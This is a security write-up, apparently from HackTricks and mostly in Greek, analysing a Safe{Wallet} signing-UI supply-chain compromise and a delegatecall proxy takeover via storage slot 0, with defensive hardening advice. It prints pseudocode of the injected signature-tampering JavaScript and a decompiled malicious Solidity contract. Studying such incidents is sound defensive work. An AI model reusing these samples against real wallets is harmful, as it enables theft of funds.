# Web3 Signing Workflow Compromise & Safe Delegatecall Proxy Takeover

{{#include ../../banners/hacktricks-training.md}}

## Επισκόπηση

Μια αλυσίδα κλοπής cold-wallet συνδύασε μια **supply-chain compromise του Safe{Wallet} web UI** με ένα **on-chain delegatecall primitive που αντικατέστησε τον δείκτη υλοποίησης του proxy (slot 0)**. Τα κύρια συμπεράσματα είναι:

- Εάν ένα dApp μπορεί να εισάγει κώδικα στη signing path, μπορεί να κάνει έναν signer να παράγει μια έγκυρη **EIP-712 signature over attacker-chosen fields** ενώ ταυτόχρονα επαναφέρει τα αρχικά δεδομένα του UI ώστε οι υπόλοιποι signers να μην το αντιληφθούν.
- Οι Safe proxies αποθηκεύουν το `masterCopy` (implementation) στο **storage slot 0**. Μια delegatecall σε ένα contract που γράφει στο slot 0 ουσιαστικά «αναβαθμίζει» τη Safe σε attacker logic, παρέχοντας πλήρη έλεγχο του wallet.

## Off-chain: Στοχευμένη παραμόρφωση υπογραφής στο Safe{Wallet}

Ένα παραποιημένο Safe bundle (`_app-*.js`) επιτέθηκε επιλεκτικά σε συγκεκριμένες Safe + signer διευθύνσεις. Η εγχυσμένη λογική εκτελούνταν αμέσως πριν από την κλήση υπογραφής:
```javascript
// Pseudocode of the malicious flow
orig = structuredClone(tx.data);
if (isVictimSafe && isVictimSigner && tx.data.operation === 0) {
tx.data.to = attackerContract;
tx.data.data = "0xa9059cbb...";      // ERC-20 transfer selector
tx.data.operation = 1;                 // delegatecall
tx.data.value = 0;
tx.data.safeTxGas = 45746;
const sig = await sdk.signTransaction(tx, safeVersion);
sig.data = orig;                       // restore original before submission
tx.data = orig;
return sig;
}
```
### Attack properties
- **Context-gated**: hard-coded allowlists για τα victim Safes/signers απέτρεψαν θόρυβο και μείωσαν την ανίχνευση.
- **Last-moment mutation**: fields (`to`, `data`, `operation`, gas) αντικαταστάθηκαν αμέσως πριν από το `signTransaction`, και μετά επαναφέρθηκαν, έτσι τα proposal payloads στο UI φαινόταν benign ενώ οι υπογραφές ταίριαζαν με το attacker payload.
- **EIP-712 opacity**: wallets εμφάνισαν structured data αλλά δεν αποκωδικοποίησαν nested calldata ούτε τόνισαν το `operation = delegatecall`, κάνοντας το mutated μήνυμα ουσιαστικά blind-signed.

### Gateway validation relevance
Safe proposals are submitted to the **Safe Client Gateway**. Πριν από τους ενισχυμένους ελέγχους, το gateway μπορούσε να αποδεχτεί μια πρόταση όπου το `safeTxHash`/signature αντιστοιχούσε σε διαφορετικά πεδία από το JSON body αν το UI τα επανέγραφε μετά την υπογραφή. Μετά το περιστατικό, το gateway πλέον απορρίπτει προτάσεις των οποίων το hash/signature δεν ταιριάζουν με την υποβληθείσα transaction. Παρόμοια server-side επαλήθευση hash πρέπει να επιβληθεί σε οποιοδήποτε signing-orchestration API.

## On-chain: Delegatecall proxy takeover via slot collision

Οι Safe proxies διατηρούν το `masterCopy` στο **storage slot 0** και αναθέτουν όλη τη λογική σε αυτό. Εφόσον το Safe υποστηρίζει **`operation = 1` (delegatecall)**, οποιαδήποτε υπογεγραμμένη συναλλαγή μπορεί να δείξει σε ένα αυθαίρετο contract και να εκτελέσει τον κώδικά του στο storage context του proxy.

Ένα attacker contract μιμήθηκε ένα ERC-20 `transfer(address,uint256)` αλλά αντί για αυτό έγραψε το `_to` στο slot 0:
```solidity
// Decompiler view (storage slot 0 write)
uint256 stor0; // slot 0
function transfer(address _to, uint256 _value) external {
stor0 = uint256(uint160(_to));
}
```
Execution path:
1. Τα θύματα υπογράφουν `execTransaction` με `operation = delegatecall`, `to = attackerContract`, `data = transfer(newImpl, 0)`.
2. Το masterCopy του Safe επικυρώνει τις υπογραφές πάνω σε αυτές τις παραμέτρους.
3. Το Proxy κάνει delegatecall προς `attackerContract`; το σώμα του `transfer` γράφει στην slot 0.
4. Η slot 0 (`masterCopy`) τώρα δείχνει σε λογική ελεγχόμενη από attacker → **πλήρης κατάληψη του πορτοφολιού και αποστράγγιση κεφαλαίων**.

## Έλεγχος ανίχνευσης και ενίσχυσης ασφάλειας

- **Ακεραιότητα UI**: pin JS assets / SRI; παρακολουθείτε διαφορές στο bundle; θεωρήστε το UI υπογραφής ως μέρος του ορίου εμπιστοσύνης.
- **Επαλήθευση κατά το χρόνο υπογραφής**: hardware wallets με **EIP-712 clear-signing**; εμφανίστε ρητά το `operation` και αποκωδικοποιήστε εμφωλευμένα calldata. Απορρίψτε την υπογραφή όταν `operation = 1` εκτός αν η πολιτική το επιτρέπει.
- **Έλεγχοι hash στο server**: gateways/services που προωθούν προτάσεις πρέπει να επαναϋπολογίζουν `safeTxHash` και να επαληθεύουν ότι οι υπογραφές ταιριάζουν με τα υποβληθέντα πεδία.
- **Πολιτική/allowlists**: κανόνες preflight για `to`, selectors, τύπους asset, και απαγορεύστε το delegatecall εκτός από ελεγμένες ροές. Απαιτήστε εσωτερική υπηρεσία πολιτικής πριν τη μετάδοση πλήρως υπογεγραμμένων συναλλαγών.
- **Σχεδίαση συμβολαίου**: αποφύγετε την έκθεση αυθαίρετου delegatecall σε multisig/treasury wallets εκτός αν είναι αυστηρά απαραίτητο. Τοποθετήστε δείκτες αναβάθμισης μακριά από το slot 0 ή προστατέψτε τους με ρητή λογική αναβάθμισης και access control.
- **Παρακολούθηση**: ειδοποιήσεις για εκτελέσεις delegatecall από πορτοφόλια που κρατούν κεφάλαια treasury, και για προτάσεις που αλλάζουν το `operation` από τυπικά μοτίβα `call`.

## Αναφορές

- [In-depth technical analysis of the Bybit hack (NCC Group)](https://www.nccgroup.com/research-blog/in-depth-technical-analysis-of-the-bybit-hack/)
- [EIP-712](https://eips.ethereum.org/EIPS/eip-712)
- [safe-client-gateway (GitHub)](https://github.com/safe-global/safe-client-gateway)

{{#include ../../banners/hacktricks-training.md}}
